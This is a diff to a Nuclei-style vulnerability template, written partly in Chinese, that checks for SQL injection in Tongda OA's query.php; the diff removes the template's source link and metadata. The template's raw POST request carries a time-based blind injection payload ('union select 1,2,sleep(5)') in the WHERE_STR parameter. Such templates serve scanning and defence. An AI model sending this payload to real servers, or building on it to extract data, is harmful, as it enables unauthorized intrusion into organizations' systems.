@@ -3,22 +3,14 @@ info:
   name: 通达 OA query.php 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/muypv651ie5tgem5
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: muypv651ie5tgem5
-    fofa: 暂无
 http:
 - raw:
   - 'POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     WHERE_STR=-@`''` union select 1,2,sleep(5)#''&
